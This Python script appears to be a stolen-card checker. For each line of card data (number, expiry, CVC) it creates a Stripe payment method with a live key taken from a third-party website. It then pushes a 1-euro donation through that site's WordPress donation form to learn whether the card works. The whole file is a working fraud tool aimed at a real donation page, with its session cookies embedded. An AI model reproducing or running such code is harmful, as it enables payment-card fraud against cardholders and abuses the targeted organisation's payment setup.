import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&referrer=https%3A%2F%2Fsf-andrei.ungheni.org&time_on_page=22151&key=pk_live_51QfliUFKZ8eMqedqNirmPDModwOs3OSHWEYU6FJVq62B3GHYpXTPhZ0uvNQ43bZ5RmVI2cBXUZZ3YQInvwCjBUNQ00wL6ZnugZ'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.2058644450.1740293773',
	    '__stripe_mid': '9c28b911-f7ae-4f19-8aed-1e7a774c7d49da8ea9',
	    '__stripe_sid': 'd5d40c77-fb62-4373-8368-01019b1a92d1716f79',
	    '_ga_BQL8LZB454': 'GS1.1.1740293772.1.0.1740293795.0.0.0',
	}
	
	headers = {
	    'authority': 'sf-andrei.ungheni.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.2058644450.1740293773; __stripe_mid=9c28b911-f7ae-4f19-8aed-1e7a774c7d49da8ea9; __stripe_sid=d5d40c77-fb62-4373-8368-01019b1a92d1716f79; _ga_BQL8LZB454=GS1.1.1740293772.1.0.1740293795.0.0.0',
	    'origin': 'https://sf-andrei.ungheni.org',
	    'referer': 'https://sf-andrei.ungheni.org/give/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1740293796319',
	}
	
	data = {
	    'data': 'ak_hp_textarea=&ak_js=1740293772415&__fluent_form_embded_post_id=2086&_fluentform_3_fluentformnonce=faca494b55&_wp_http_referer=%2Fgive%2F&payment_input%5B%5D=Doneaz%C4%83%201%20Euro&custom-payment-amount=&payment_method=stripe&payment_input_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://sf-andrei.ungheni.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
